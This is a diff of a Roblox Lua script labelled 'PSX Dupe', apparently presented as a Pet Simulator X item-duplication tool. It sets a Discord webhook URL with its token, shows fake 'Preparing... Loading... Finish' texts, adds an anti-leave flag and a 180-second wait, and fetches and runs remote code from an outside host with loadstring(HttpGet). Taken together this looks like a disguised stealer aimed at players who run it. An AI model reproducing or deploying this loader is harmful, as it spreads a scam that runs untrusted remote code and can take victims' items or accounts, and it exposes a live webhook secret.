@@ -2,16 +2,16 @@ _G.UserID = 1809183167
 
 _G.Webhook = "https://discord.com/api/webhooks/1100811829392965712/pjrFcD2NS3bSSjwn239jr_5Xh4YfAljmvpVnrr6dG4E2wIWPkrbXdiSfGF8JzAwEsbcr"
 
-_G.MouseLock = false
+_G.AntiLeave = false
 
-_G.ScriptName = "PSX Dupe"
+_G.ScriptName = "PSX DUPE"
 
-_G.FirstText = "Preparing"
+_G.FirstText = "Preparing..."
 
-_G.SecondText = "Loading"
+_G.SecondText = "Loading..."
 
-_G.ThirdText = "finish"
+_G.ThirdText = "Finish"
 
 _G.WaitingTime = 180
 
-loadstring(game:HttpGet("https://rizzhub.glitch.me/scripts/Script.lua", true))()
+loadstring(game:HttpGet("https://rizz69.github.io/Script.lua", true))()
